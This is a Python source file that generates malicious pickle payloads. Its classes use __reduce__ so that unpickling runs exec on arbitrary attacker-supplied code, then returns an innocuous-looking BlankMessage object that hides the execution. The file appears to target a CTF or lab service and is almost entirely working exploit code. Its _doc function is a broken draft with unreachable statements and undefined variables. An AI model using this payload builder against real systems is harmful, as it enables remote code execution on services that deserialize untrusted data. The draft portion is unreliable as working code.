def _doc():
    code = None
    
    '''
    Simple, but unpicklable
    '''
    exec(code)
    return eval("BlankMessage({text})", globals())
    
    '''
    Complex and unpicklable yet too
    '''
    globs = globals()
    exec_code = exec(code, globs)
    exec_list = list([exec_code])
    
    finish = eval("BlankMessage('{text}')")
    finish_list = list([finish])
    
    # Just to calculate `executed` var, but ignore it value
    both = executed + arr  # __add__
    return both[-1]  # __getitem__
    
    '''
    Very complex and about to be picklable
    '''
    return list.__getitem__(
        # self:
        list.__add__(
            [exec(code, globals())],
            [eval("BlankMessage({text})")]
        ),
        # index:
        -1
    )

def generate_executable(code):
    class GetGlobals:
        def __reduce__(self):
            return (globals, tuple())
    getGlobals = GetGlobals()
    
    class ExecCode:
        def __reduce__(self):
            return (exec, (code, getGlobals))
    res = ExecCode()
    return res

def generate_message(code, text):
    finializer_code = "BlankMessage('{text}')".format(text=text)

    execCode = generate_executable(code)
    
    class Finish:
        def __reduce__(self):
            return (eval, (finializer_code, ))
    finish = Finish()
            
    class ExecCodeToList:
        def __reduce__(self):
            return (list, ([execCode], ))
    exec_list = ExecCodeToList()
            
    class FinishToList:
        def __reduce__(self):
            return (list, ([finish], ))
    finish_list = FinishToList()
    
    class AddLists:
        def __reduce__(self):
            return (list.__add__, (exec_list, finish_list))
    add_lists = AddLists()
    
    class LastIndex:
        def __reduce__(self):
            return (list.__getitem__, (add_lists, -1))
    lastIndex = LastIndex()
    
    return lastIndex
